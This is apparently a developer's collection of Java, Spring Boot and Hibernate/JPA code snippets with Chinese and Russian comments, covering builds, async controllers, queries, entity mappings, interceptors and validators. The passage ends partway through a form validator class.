        mavenCentral()
    }
    dependencies {
        classpath("org.springframework.boot:spring-boot-gradle-plugin:1.1.6.RELEASE")
    }
}

apply plugin: 'java'
apply plugin: 'eclipse'
apply plugin: 'idea'
apply plugin: 'spring-boot'

apply plugin: 'application'
run {
    args 'sample.txt'
}

jar {
    baseName = 'gs-uploading-files'
    version =  '0.1.0'
}

repositories {
    mavenLocal()
    mavenCentral()
    maven { url "http://repo.spring.io/libs-release" }
}

dependencies {
    compile("org.springframework.boot:spring-boot-starter-web")
    testCompile("junit:junit")
}

task wrapper(type: Wrapper) {
    gradleVersion = '1.11'
}
--------------------------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.builder.SpringApplicationBuilder;
import org.springframework.boot.logging.LoggingSystem;
import org.springframework.boot.web.support.SpringBootServletInitializer;

import lombok.extern.slf4j.Slf4j;

@SpringBootApplication
@Slf4j
public class ChapterApplication extends SpringBootServletInitializer implements CommandLineRunner{

	public static void main(String[] args) {
		log.info("jar,chapter开始启动!");
		SpringApplication.run(ChapterApplication.class, args);
	//	new SpringApplicationBuilder().sources(ChapterApplication.class).web(false).run(args);
    //之后这里设置业务逻辑 比如挂起一个线程 或者设置一个定时任务。保证不退出
		//不然它就是一个启动类，启动后就停止了。
		log.info("jar,chapter启动完成!");
	} 
	 
	@Override
	protected SpringApplicationBuilder configure(SpringApplicationBuilder application) {
		log.info("外部tomcat,chapter启动!");
		return application.sources(ChapterApplication.class);
	}

	@Override
	public void run(String... args) throws Exception {
		log.info("CommandLineRunner运行,info输出");
//		loggingSystem.setLogLevel(null, LogLevel.DEBUG);
		log.debug("CommandLineRunner运行:debug输出");
	}
	
	@Autowired
	LoggingSystem loggingSystem;
}
--------------------------------------------------------------------------------------------------------
      @GetMapping(value = "/testCallable")
      public Callable<String> echoHelloWorld()
      {
            return () ->
            {
                  Thread.sleep(ThreadLocalRandom.current().nextInt(5000));
                   
                  return "Hello World !!";
            };
      }
	  
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.asyncDispatch;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.request;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;
 
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.WebMvcTest;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;
import org.springframework.test.web.servlet.result.MockMvcResultHandlers;
 
import com.howtodoinjava.springasyncexample.web.controller.HelloWorldCallableController;
 
@RunWith(SpringRunner.class)
@WebMvcTest(HelloWorldCallableController.class)
public class HelloWorldCallableControllerTest {
 
      @Autowired
      private MockMvc mockMvc;
 
      @Test
      public void testHelloWorldController() throws Exception
      {
            MvcResult mvcResult = mockMvc.perform(get("/testCallable"))
                                                .andExpect(request().asyncStarted())
                                                .andDo(MockMvcResultHandlers.log())
                                                .andReturn();
             
            mockMvc.perform(asyncDispatch(mvcResult)).andExpect(status().isOk())
                              .andExpect(content().contentTypeCompatibleWith("text/plain"))
                              .andExpect(content().string("Hello World !!"));
      }
}
--------------------------------------------------------------------------------------------------------
    @RequestMapping("/test3")
    public
    @ResponseBody
    WebAsyncTask<String> handleRequest (HttpServletRequest r) {
        System.out.println("asyncSupported: " + r.isAsyncSupported());
        System.out.println(Thread.currentThread().getName());

        Callable<String> callable = () -> {
            System.out.println(Thread.currentThread().getName());
            return "WebAsyncTask test";
        };

        ConcurrentTaskExecutor t = new ConcurrentTaskExecutor(
                  Executors.newFixedThreadPool(1));
        return new WebAsyncTask<>(10000L, t, callable);
    }
	
    @Bean
    WebMvcConfigurer configurer(){
        return new WebMvcConfigurerAdapter(){
            @Override
            public void configureAsyncSupport (AsyncSupportConfigurer configurer) {
                ThreadPoolTaskExecutor t = new ThreadPoolTaskExecutor();
                t.setCorePoolSize(10);
                t.setMaxPoolSize(100);
                t.setQueueCapacity(50);
                t.setAllowCoreThreadTimeOut(true);
                t.setKeepAliveSeconds(120);
                t.initialize();
                configurer.setTaskExecutor(t);
            }
        };
    }
--------------------------------------------------------------------------------------------------------
List<Author> authors = em.createQuery("SELECT a FROM Author a ORDER BY a.id ASC", Author.class)
                                    .setMaxResults(5)
                                    .setFirstResult(0)
                                    .getResultList();
									
TypedQuery<Author> q = em.createQuery(
                "SELECT a FROM Author a WHERE a.id = :id", Author.class);
q.setParameter("id", 1L);
Author a = q.getSingleResult();

TypedQuery<Book> q = em.createQuery(
             "SELECT b FROM Book b WHERE b.id = function('calculate', 1, 2)",
             Book.class);
Book b = q.getSingleResult();

EntityGraph graph = em.getEntityGraph("graph.Order.items");
 
Order newOrder = em.find(Order.class, 1L, Collections.singletonMap("javax.persistence.fetchgraph", graph));
RootGraph graph = GraphParser.parse(Order.class, "items", em);
 
Order newOrder = em.find(Order.class, 1L, Collections.singletonMap("javax.persistence.fetchgraph", graph));
RootGraph graph = GraphParser.parse(Order.class, "items(product(supplier))", em);
 
Order newOrder = em.find(Order.class, 1L, Collections.singletonMap("javax.persistence.fetchgraph", graph));

RootGraph graph1 = GraphParser.parse(Order.class, "items(product(supplier))", em);
RootGraph graph2 = GraphParser.parse(Order.class, "customer", em);
EntityGraph graph = EntityGraphs.merge(em, Order.class, graph1, graph2);
 
Order newOrder = em.find(Order.class, 1L, Collections.singletonMap("javax.persistence.fetchgraph", graph));

--------------------------------------------------------------------------------------------------------
ExampleMatcher ignoringExampleMatcher = ExampleMatcher.matchingAny().withIgnorePaths("createdDate", "lastModifiedDate", "createdBy", "lastModifiedBy");

final ExampleMatcher caseInsensitiveExampleMatcher = ExampleMatcher.matchingAll().withIgnoreCase();
		
caseInsensitiveExampleMatcher
--------------------------------------------------------------------------------------------------------
@Query("select case when count(c)> 0 then true else false end from Car c where lower(c.model) like lower(:model)")
boolean existsCarLikeCustomQuery(@Param("model") String model);
--------------------------------------------------------------------------------------------------------
mvn archetype:generate 
    -DgroupId=ru.carousel
    -DartifactId=carousel 
    -Dversion=1.0-SNAPSHOT 
    -DarchetypeArtifactId=maven-archetype-quickstart
	
mvn install:install-file 
    -Dfile=org.eclipse.swt.win32.win32.x86_3.7.1.v3738a.jar
    -DgroupId=org.eclipse.swt.win32.win32.x86 
    -DartifactId=org.eclipse.swt.win32.win32.x86 
    -Dversion=3.7.1.v3738 
    -Dpackaging=jar

mvn install:install-file
    -Dfile=org.eclipse.core.runtime_3.7.0.v20110110.jar
    -DgroupId=org.eclipse.core.runtime
    -DartifactId=org.eclipse.core.runtime
    -Dversion=3.7.0.v20110110
    -Dpackaging=jar

mvn install:install-file
    -Dfile=org.eclipse.core.commands_3.6.0.I20110111-0800.jar
    -DgroupId=org.eclipse.core.commands
    -DartifactId=org.eclipse.core.commands
    -Dversion=3.6.0.I20110111-0800
    -Dpackaging=jar

mvn install:install-file
    -Dfile=org.eclipse.equinox.common_3.6.0.v20110523.jar
    -DgroupId=org.eclipse.equinox.common
    -DartifactId=org.eclipse.equinox.common
    -Dversion=3.6.0.v20110523
    -Dpackaging=jar

mvn install:install-file
    -Dfile=org.eclipse.jface_3.5.2.M20100120-0800.jar
    -DgroupId=org.eclipse.jface
    -DartifactId=org.eclipse.jface
    -Dversion=3.5.2.M20100120-0800
    -Dpackaging=jar
--------------------------------------------------------------------------------------------------------

    mvn compile - компиляция проекта;
    mvn test - выполнение теста;
    mvn exec:java -Dexec.mainClass=ru.carousel.App - выполнение программы;
    mvn jar:jar - сборка проекта;
    mvn package - компиляция + тестирование + сборка;
    mvn install –Dmaven.test.skip=true - компиляция + сборка;

--------------------------------------------------------------------------------------------------------
    <plugin>
        <groupId>
            com.akathist.maven.plugins.launch4j
        </groupId>
        <artifactId>launch4j-maven-plugin</artifactId>
        <executions>
            <execution>
                <id>plugin-loader</id>
                <phase>package</phase>
                <goals>
                    <goal>launch4j</goal>
                </goals>
                <configuration>
                    <headerType>gui</headerType>
                    <outfile>${exeFileName}.exe</outfile>
                    <jar>${project.artifactId}.jar</jar>
                    <errTitle>${product.title}</errTitle>
                    <icon>favicon.ico</icon>
                    <classPath>
                        <mainClass>Boostrap</mainClass>
                        <addDependencies>
                            true
                        </addDependencies>
                        <preCp>anything</preCp>
                    </classPath>
                    <jre>
                        <minVersion>
                           ${jdkVersion}
                        </minVersion>
                    </jre>
                    <versionInfo>
                        <fileVersion>
                            ${project.version}
                        </fileVersion>
                        <txtFileVersion>
                            ${project.version}
                        </txtFileVersion>
                        <fileDescription>
                            Swing application
                        </fileDescription>
                        <copyright>
                          Copyright © 2011 ${product.company}
                        </copyright>
                        <productVersion>
                            ${project.version}
                        </productVersion>
                        <txtProductVersion>
                            ${project.version}
                        </txtProductVersion>
                        <companyName>
                            ${product.company}
                        </companyName>
                        <productName>
                            ${product.title}
                        </productName>
                        <internalName>
                            ${exeFileName}
                        </internalName>
                        <originalFilename>
                            ${exeFileName}.exe
                        </originalFilename>
                    </versionInfo>
                </configuration>
            </execution>
        </executions>
    </plugin>
--------------------------------------------------------------------------------------------------------
create sequence SEQ_USER
minvalue 1
start with 10
increment by 1
cache 5;

  @Id
    @GeneratedValue(strategy=GenerationType.SEQUENCE,
                    generator="users_seq")
    @SequenceGenerator(name="users_seq",
                       sequenceName="SEQ_USER",
                       allocationSize=5)
    @Column(name="id", updatable=false, nullable=false)
    private Integer  id;
--------------------------------------------------------------------------------------------------------
import javax.persistence.Query;
import javax.persistence.EntityManager;

import org.apache.commons.lang.StringUtils;

...

@SuppressWarnings("unchecked")
public List<Author< getAuthorsByLastName(String lastName)
{
    String queryString = "SELECT a FROM Author a " +
                         "WHERE LOWER(a.lastName) = :lastName";
    Query query = getEntityManager().createQuery(queryString);
    
    query.setParameter("lastName", StringUtils.lowerCase(lastName));
    return query.getResultList();
}

http://java-online.ru/hibernate-faq.xhtml

List<User> users
users = session.createCriteria(User.class)
               .setFirstResult(2)
               .setMaxResults(15).list();
--------------------------------------------------------------------------------------------------------
docker run --name questionmarks-psql \
    -p 5432:5432 \
    -e POSTGRES_DB=questionmarks \
    -e POSTGRES_PASSWORD=mysecretpassword \
    -d postgres
spring.datasource.url=jdbc:postgresql://localhost/questionmarks
spring.datasource.username=postgres
spring.datasource.password=mysecretpassword
spring.datasource.driver-class-name=org.postgresql.Driver

alter table exam
  add column created_at timestamp without time zone not null default now(),
  add column edited_at timestamp without time zone not null default now(),
  add column published boolean not null default false;
--------------------------------------------------------------------------------------------------------
ExampleMatcher matcher = ExampleMatcher.matching()
		.withIgnoreCase()
		.withMatcher("lastName", startsWith())
		.withIncludeNullValues();
--------------------------------------------------------------------------------------------------------
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    String user="springstudent";
    String pass="springstudent";
    String jdbcUrl = "jdbc:mysql://localhost:3306/web_customer_tracker&allowPublicKeyRetrieval=false&useSSL=false&serverTimeZone=UTC";
    String driver="com.mysql.cj.jdbc.Driver";

    try {
        PrintWriter out = response.getWriter();
        out.println("Connecting to database "+jdbcUrl);

        Class.forName(driver);
        Connection myConn = DriverManager.getConnection(jdbcUrl,user,pass);

        out.println("Success!");
        myConn.close();
    }catch(Exception e) {
        e.printStackTrace();
    }
}

 com.mysql.cj.jdbc.Driver
--------------------------------------------------------------------------------------------------------
import javax.persistence.DiscriminatorColumn;
import javax.persistence.DiscriminatorType;
import javax.persistence.Entity;
import javax.persistence.Id;
import javax.persistence.Inheritance;
import javax.persistence.InheritanceType;

import org.hibernate.annotations.DiscriminatorFormula;

@Entity
@Inheritance(strategy = InheritanceType.SINGLE_TABLE)
@DiscriminatorColumn(name = "product_type", discriminatorType = DiscriminatorType.INTEGER)
// @DiscriminatorFormula("case when author is not null then 1 else 2 end")
public class MyProduct {
    @Id
    private long productId;

    private String name;

    public MyProduct() {
    }

    public MyProduct(long productId, String name) {
        super();
        this.productId = productId;
        this.name = name;
    }

    public long getProductId() {
        return productId;
    }

    public void setProductId(long productId) {
        this.productId = productId;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

}
--------------------------------------------------------------------------------------------------------
import javax.persistence.DiscriminatorValue;
import javax.persistence.Entity;

@Entity
@DiscriminatorValue("1")
public class Book extends MyProduct {
    private String author;

    public Book() {
    }

    public Book(long productId, String name, String author) {
        super(productId, name);
        this.author = author;
    }

    public String getAuthor() {
        return author;
    }

    public void setAuthor(String author) {
        this.author = author;
    }

}
--------------------------------------------------------------------------------------------------------
mport javax.persistence.Entity;
import javax.persistence.Id;

import org.hibernate.annotations.Polymorphism;
import org.hibernate.annotations.PolymorphismType;

@Entity
@Polymorphism(type = PolymorphismType.EXPLICIT)
public class Bag implements Item {

    @Id
    private long bagId;

    private String type;

    public Bag(long bagId, String type) {
        this.bagId = bagId;
        this.type = type;
    }

    public long getBagId() {
        return bagId;
    }

    public void setBagId(long bagId) {
        this.bagId = bagId;
    }

    public String getType() {
        return type;
    }

    public void setType(String type) {
        this.type = type;
    }
}
--------------------------------------------------------------------------------------------------------
import java.io.Serializable;
import java.util.Properties;
import java.util.stream.Stream;

import org.hibernate.HibernateException;
import org.hibernate.MappingException;
import org.hibernate.engine.spi.SharedSessionContractImplementor;
import org.hibernate.id.Configurable;
import org.hibernate.id.IdentifierGenerator;
import org.hibernate.service.ServiceRegistry;
import org.hibernate.type.Type;

public class MyGenerator implements IdentifierGenerator, Configurable {

    private String prefix;

    @Override
    public Serializable generate(SharedSessionContractImplementor session, Object obj) throws HibernateException {

        String query = String.format("select %s from %s", 
            session.getEntityPersister(obj.getClass().getName(), obj).getIdentifierPropertyName(),
            obj.getClass().getSimpleName());

        Stream<String> ids = session.createQuery(query).stream();

        Long max = ids.map(o -> o.replace(prefix + "-", ""))
            .mapToLong(Long::parseLong)
            .max()
            .orElse(0L);

        return prefix + "-" + (max + 1);
    }

    @Override
    public void configure(Type type, Properties properties, ServiceRegistry serviceRegistry) throws MappingException {
        prefix = properties.getProperty("prefix");
    }

}
--------------------------------------------------------------------------------------------------------
import java.io.Serializable;
import java.util.Date;

import org.hibernate.EmptyInterceptor;
import org.hibernate.type.Type;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.baeldung.hibernate.interceptors.entity.User;

public class CustomInterceptor extends EmptyInterceptor {
    private static final Logger logger = LoggerFactory.getLogger(CustomInterceptor.class);

    @Override
    public boolean onSave(Object entity, Serializable id, Object[] state, String[] propertyNames, Type[] types) {
        if (entity instanceof User) {
            logger.info(((User) entity).toString());
        }
        return super.onSave(entity, id, state, propertyNames, types);
    }
    
    @Override
    public boolean onFlushDirty(Object entity, Serializable id, Object[] currentState, Object [] previousState, String[] propertyNames, Type[] types) {
        if (entity instanceof User) {
            ((User) entity).setLastModified(new Date());
            logger.info(((User) entity).toString());
        }
        return super.onFlushDirty(entity, id, currentState, previousState, propertyNames, types);
    }
}
--------------------------------------------------------------------------------------------------------
import java.io.Serializable;
import java.util.Iterator;

import org.hibernate.CallbackException;
import org.hibernate.EntityMode;
import org.hibernate.Interceptor;
import org.hibernate.Transaction;
import org.hibernate.type.Type;

public class CustomInterceptorImpl implements Interceptor, Serializable {

    @Override
    public boolean onLoad(Object entity, Serializable id, Object[] state, String[] propertyNames, Type[] types) throws CallbackException {
        // TODO Auto-generated method stub
        return false;
    }

    @Override
    public boolean onFlushDirty(Object entity, Serializable id, Object[] currentState, Object[] previousState, String[] propertyNames, Type[] types) throws CallbackException {
        // TODO Auto-generated method stub
        return false;
    }

    @Override
    public boolean onSave(Object entity, Serializable id, Object[] state, String[] propertyNames, Type[] types) throws CallbackException {
        // TODO Auto-generated method stub
        return false;
    }

    @Override
    public void onDelete(Object entity, Serializable id, Object[] state, String[] propertyNames, Type[] types) throws CallbackException {
        // TODO Auto-generated method stub

    }

    @Override
    public void onCollectionRecreate(Object collection, Serializable key) throws CallbackException {
        // TODO Auto-generated method stub

    }

    @Override
    public void onCollectionRemove(Object collection, Serializable key) throws CallbackException {
        // TODO Auto-generated method stub

    }

    @Override
    public void onCollectionUpdate(Object collection, Serializable key) throws CallbackException {
        // TODO Auto-generated method stub

    }

    @Override
    public void preFlush(Iterator entities) throws CallbackException {
        // TODO Auto-generated method stub

    }

    @Override
    public void postFlush(Iterator entities) throws CallbackException {
        // TODO Auto-generated method stub

    }

    @Override
    public Boolean isTransient(Object entity) {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public int[] findDirty(Object entity, Serializable id, Object[] currentState, Object[] previousState, String[] propertyNames, Type[] types) {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public Object instantiate(String entityName, EntityMode entityMode, Serializable id) throws CallbackException {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public String getEntityName(Object object) throws CallbackException {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public Object getEntity(String entityName, Serializable id) throws CallbackException {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public void afterTransactionBegin(Transaction tx) {
        // TODO Auto-generated method stub

    }

    @Override
    public void beforeTransactionCompletion(Transaction tx) {
        // TODO Auto-generated method stub

    }

    @Override
    public void afterTransactionCompletion(Transaction tx) {
        // TODO Auto-generated method stub

    }

    @Override
    public String onPrepareStatement(String sql) {
        // TODO Auto-generated method stub
        return null;
    }

}
--------------------------------------------------------------------------------------------------------
	@Column(name = "name", columnDefinition="VARCHAR(128)") 
	private String name; 
	 
	@Lob 
	@Column(name = "photo", columnDefinition="BLOB") 
	private byte[] photo;
--------------------------------------------------------------------------------------------------------
import javax.persistence.AttributeConverter;
import javax.persistence.Converter;

import com.baeldung.hibernate.pojo.PersonName;

@Converter
public class PersonNameConverter implements AttributeConverter<PersonName, String> {

    private static final String SEPARATOR = ", ";

    @Override
    public String convertToDatabaseColumn(PersonName personName) {
        if (personName == null) {
            return null;
        }

        StringBuilder sb = new StringBuilder();
        if (personName.getSurname() != null && !personName.getSurname()
            .isEmpty()) {
            sb.append(personName.getSurname());
            sb.append(SEPARATOR);
        }

        if (personName.getName() != null && !personName.getName()
            .isEmpty()) {
            sb.append(personName.getName());
        }

        return sb.toString();
    }

    @Override
    public PersonName convertToEntityAttribute(String dbPersonName) {
        if (dbPersonName == null || dbPersonName.isEmpty()) {
            return null;
        }

        String[] pieces = dbPersonName.split(SEPARATOR);

        if (pieces == null || pieces.length == 0) {
            return null;
        }

        PersonName personName = new PersonName();        
        String firstPiece = !pieces[0].isEmpty() ? pieces[0] : null;
        if (dbPersonName.contains(SEPARATOR)) {
            personName.setSurname(firstPiece);

            if (pieces.length >= 2 && pieces[1] != null && !pieces[1].isEmpty()) {
                personName.setName(pieces[1]);
            }
        } else {
            personName.setName(firstPiece);
        }

        return personName;
    }
}
--------------------------------------------------------------------------------------------------------
//package com.paragon.microservices.distributor.configuration;
//
//import lombok.RequiredArgsConstructor;
//import org.springframework.beans.factory.config.BeanPostProcessor;
//import org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;
//import org.springframework.boot.autoconfigure.condition.SearchStrategy;
//import org.springframework.boot.autoconfigure.jmx.ParentAwareNamingStrategy;
//import org.springframework.boot.autoconfigure.orm.jpa.JpaProperties;
//import org.springframework.context.annotation.Bean;
//import org.springframework.context.annotation.Configuration;
//import org.springframework.context.annotation.Description;
//import org.springframework.context.annotation.Primary;
//import org.springframework.dao.annotation.PersistenceExceptionTranslationPostProcessor;
//import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
//import org.springframework.jmx.export.annotation.AnnotationJmxAttributeSource;
//import org.springframework.jmx.export.naming.ObjectNamingStrategy;
//import org.springframework.orm.hibernate5.LocalSessionFactoryBean;
//import org.springframework.orm.jpa.JpaDialect;
//import org.springframework.orm.jpa.JpaTransactionManager;
//import org.springframework.orm.jpa.JpaVendorAdapter;
//import org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean;
//import org.springframework.orm.jpa.persistenceunit.DefaultPersistenceUnitManager;
//import org.springframework.orm.jpa.persistenceunit.PersistenceUnitManager;
//import org.springframework.orm.jpa.support.PersistenceAnnotationBeanPostProcessor;
//import org.springframework.orm.jpa.vendor.HibernateJpaDialect;
//import org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter;
//import org.springframework.transaction.PlatformTransactionManager;
//import org.springframework.transaction.annotation.EnableTransactionManagement;
//import org.springframework.transaction.support.TransactionTemplate;
//
//import javax.sql.DataSource;
//import java.io.IOException;
//import java.util.Properties;
//import java.util.UUID;
//
//import static org.apache.commons.lang3.StringUtils.join;
//
//@Configuration
//@RequiredArgsConstructor
//@EnableTransactionManagement
//@EnableJpaRepositories
////        (
////        basePackages = {
////                "com.paragon.microservices.distributor.model",
////                "com.paragon.microservices.distributor.repository"
////        }
////)
//@Description("Paragon MicroServices Distributor datasource configuration")
//public class DataSourceConfiguration {
//
//    /**
//     * Default persistence unit name
//     */
//    public static final String DEFAULT_PERSISTENCE_UNIT_NAME = "local";
//    /**
//     * Default domain name prefix
//     */
//    public static final String DEFAULT_DOMAIN_NAME_PREFIX = "domain-";
//
//    @Bean
//    @Primary
//    @ConditionalOnMissingBean(name = {"entityManagerFactory"})
//    @Description("Local container entity manager factory bean")
//    public LocalContainerEntityManagerFactoryBean entityManagerFactory(final DataSource dataSource, final JpaProperties jpaProperties) {
//        final LocalContainerEntityManagerFactoryBean factoryBean = new LocalContainerEntityManagerFactoryBean();
//        factoryBean.setDataSource(dataSource);
//        factoryBean.setJpaVendorAdapter(this.jpaVendorAdapter());
//        factoryBean.setJpaPropertyMap(jpaProperties.getProperties());
//        factoryBean.setJpaDialect(this.jpaDialect());
//        factoryBean.setPackagesToScan(this.getPackagesToScan());
//        factoryBean.setPersistenceUnitName(DEFAULT_PERSISTENCE_UNIT_NAME);
//        return factoryBean;
//    }
//
//    /**
//     * Returns {@link JpaVendorAdapter} configuration
//     *
//     * @return {@link JpaVendorAdapter} configuration
//     */
//    @Bean
//    @ConditionalOnMissingBean
//    public JpaVendorAdapter jpaVendorAdapter() {
//        return new HibernateJpaVendorAdapter();
//    }
//
//    @Bean
//    @ConditionalOnMissingBean(type = "JpaTransactionManager")
//    @Description("JPA transaction manager bean")
//    public JpaTransactionManager transactionManager(final LocalContainerEntityManagerFactoryBean entityManagerFactory) {
//        final JpaTransactionManager transactionManager = new JpaTransactionManager();
//        transactionManager.setEntityManagerFactory(entityManagerFactory.getObject());
//        return transactionManager;
//    }
//
////    @Bean(name = "transactionManager")
////    public HibernateTransactionManager transactionManager(final DataSource dataSource) {
////        final HibernateTransactionManager txManager = new HibernateTransactionManager();
////        txManager.setSessionFactory(this.sessionFactory(dataSource).getObject());
////        return txManager;
////    }
//
//    @Bean
//    @Primary
//    @Description("Transaction template bean")
//    public TransactionTemplate transactionTemplate(final PlatformTransactionManager transactionManager) {
//        return new TransactionTemplate(transactionManager);
//    }
//
//    /**
//     * Returns {@link ParentAwareNamingStrategy} configuration
//     *
//     * @return {@link ParentAwareNamingStrategy} configuration
//     */
//    @Bean
//    @ConditionalOnMissingBean(value = ObjectNamingStrategy.class, search = SearchStrategy.CURRENT)
//    @Description("Parent aware object naming strategy bean")
//    public ParentAwareNamingStrategy objectNamingStrategy() {
//        final ParentAwareNamingStrategy namingStrategy = new ParentAwareNamingStrategy(new AnnotationJmxAttributeSource());
//        namingStrategy.setDefaultDomain(join(DEFAULT_DOMAIN_NAME_PREFIX, UUID.randomUUID().toString()));
//        return namingStrategy;
//    }
//
//    /**
//     * Returns {@link JpaDialect} configuration
//     *
//     * @return {@link JpaDialect} configuration
//     */
//    @Bean
//    @Description("JPA dialect bean")
//    public JpaDialect jpaDialect() {
//        return new HibernateJpaDialect();
//    }
//
//    /**
//     * Returns {@link PersistenceExceptionTranslationPostProcessor} configuration
//     *
//     * @return {@link PersistenceExceptionTranslationPostProcessor} configuration
//     */
//    @Bean
//    @Description("Persistence exception translation post processor bean")
//    public PersistenceExceptionTranslationPostProcessor exceptionTranslation() {
//        return new PersistenceExceptionTranslationPostProcessor();
//    }
//
//    /**
//     * Returns {@link PersistenceUnitManager} configuration
//     *
//     * @return {@link PersistenceUnitManager} configuration
//     */
//    @Bean
//    @Description("Persistence unit manager bean")
//    public PersistenceUnitManager persistenceUnitManager(final DataSource dataSource) {
//        final DefaultPersistenceUnitManager manager = new DefaultPersistenceUnitManager();
//        manager.setDefaultDataSource(dataSource);
//        manager.setDefaultPersistenceUnitName(DEFAULT_PERSISTENCE_UNIT_NAME);
//        return manager;
//    }
//
//    /**
//     * Returns {@link BeanPostProcessor} configuration
//     *
//     * @return {@link BeanPostProcessor} configuration
//     */
//    @Bean
//    @Description("Post processor bean")
//    public BeanPostProcessor postProcessor() {
//        final PersistenceAnnotationBeanPostProcessor postProcessor = new PersistenceAnnotationBeanPostProcessor();
//        postProcessor.setDefaultPersistenceUnitName(DEFAULT_PERSISTENCE_UNIT_NAME);
//        return postProcessor;
//    }
//
//    /**
//     * Returns {@link LocalSessionFactoryBean} configuration
//     *
//     * @return {@link LocalSessionFactoryBean} configuration
//     */
//    @Bean
//    @Description("Local session factory bean")
//    public LocalSessionFactoryBean sessionFactory(final DataSource dataSource, final JpaProperties jpaProperties) throws IOException {
//        final LocalSessionFactoryBean sessionFactory = new LocalSessionFactoryBean();
//        sessionFactory.setDataSource(dataSource);
//        //sessionFactory.setPackagesToScan(this.getPackagesToScan());
//
//        final Properties properties = new Properties();
//        properties.putAll(jpaProperties.getProperties());
//        sessionFactory.setHibernateProperties(properties);
//        sessionFactory.afterPropertiesSet();
//        return sessionFactory;
//    }
//
//    protected String[] getPackagesToScan() {
//        return new String[]{"com.paragon.microservices.distributor.model", "com.paragon.microservices.distributor.model"};
//    }
//}
{"userId":"ee9cb324-1781-4bb6-6131-08d727c2cbb2","ownerId":"b3a341c7-43d0-41b9-af35-cb4cf3b13476"}
{"userId": "ee9cb324-1781-4bb6-6131-08d727c2cbb2","ownerId": "b3a341c7-43d0-41b9-af35-cb4cf3b13476"}
--------------------------------------------------------------------------------------------------------
import javax.persistence.GeneratedValue;
import javax.persistence.GenerationType;
import javax.persistence.Id;
import javax.persistence.MappedSuperclass;

import com.fasterxml.jackson.annotation.JsonIgnore;

import org.hibernate.annotations.ColumnDefault;
import org.hibernate.annotations.CreationTimestamp;
import org.hibernate.annotations.UpdateTimestamp;

import lombok.Getter;
import lombok.Setter;

@MappedSuperclass
@Getter @Setter
public class BaseEntity {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    protected Integer id;

    @CreationTimestamp
    @ColumnDefault("CURRENT_TIMESTAMP")
    protected Date createdAt;

    @UpdateTimestamp
    @ColumnDefault("CURRENT_TIMESTAMP")
    protected Date updatedAt;
}

CREATE TABLE my_table (
        ...
      updated_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
    );
--------------------------------------------------------------------------------------------------------
import java.net.InetAddress;
import java.net.UnknownHostException;
 
public class MyLocalHostName {
    public static void main(String a[]){
        try {
            InetAddress myHost = InetAddress.getLocalHost();
            System.out.println(myHost.getHostName());
        } catch (UnknownHostException ex) {
            ex.printStackTrace();
        }
    }
}

https://knative.dev/v0.4-docs/serving/samples/hello-world/helloworld-java/
https://www.springboottutorial.com/spring-boot-with-embedded-servers-tomcat-jetty
https://o7planning.org/ru/11669/spring-boot
https://www.javatpoint.com/spring-boot-properties
https://o7planning.org/ru/11665/spring-boot-hibernate-and-spring-transaction-tutorial
--------------------------------------------------------------------------------------------------------
import org.apache.commons.validator.routines.EmailValidator;
import org.o7planning.sbshoppingcart.form.CustomerForm;
import org.springframework.stereotype.Component;
import org.springframework.validation.Errors;
import org.springframework.validation.ValidationUtils;
import org.springframework.validation.Validator;
 
@Component
public class CustomerFormValidator implements Validator {
 
   private EmailValidator emailValidator = EmailValidator.getInstance();
 
   // This validator only checks for the CustomerForm.
   @Override
   public boolean supports(Class<?> clazz) {
      return clazz == CustomerForm.class;
   }
 
   @Override
   public void validate(Object target, Errors errors) {
      CustomerForm custInfo = (CustomerForm) target;
 
      // Check the fields of CustomerForm.
      ValidationUtils.rejectIfEmptyOrWhitespace(errors, "name", "NotEmpty.customerForm.name");
      ValidationUtils.rejectIfEmptyOrWhitespace(errors, "email", "NotEmpty.customerForm.email");
      ValidationUtils.rejectIfEmptyOrWhitespace(errors, "address", "NotEmpty.customerForm.address");
      ValidationUtils.rejectIfEmptyOrWhitespace(errors, "phone", "NotEmpty.customerForm.phone");
 
      if (!emailValidator.isValid(custInfo.getEmail())) {
         errors.rejectValue("email", "Pattern.customerForm.email");
      }
   }
}

import org.o7planning.sbshoppingcart.dao.ProductDAO;
import org.o7planning.sbshoppingcart.entity.Product;
import org.o7planning.sbshoppingcart.form.ProductForm;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springframework.validation.Errors;
import org.springframework.validation.ValidationUtils;
import org.springframework.validation.Validator;
 
@Component
public class ProductFormValidator implements Validator {
 
   @Autowired
   private ProductDAO productDAO;
 
   // This validator only checks for the ProductForm.
   @Override
   public boolean supports(Class<?> clazz) {
      return clazz == ProductForm.class;
   }
 
   @Override
   public void validate(Object target, Errors errors) {
      ProductForm productForm = (ProductForm) target;
 
      // Check the fields of ProductForm.
      ValidationUtils.rejectIfEmptyOrWhitespace(errors, "code", "NotEmpty.productForm.code");
      ValidationUtils.rejectIfEmptyOrWhitespace(errors, "name", "NotEmpty.productForm.name");
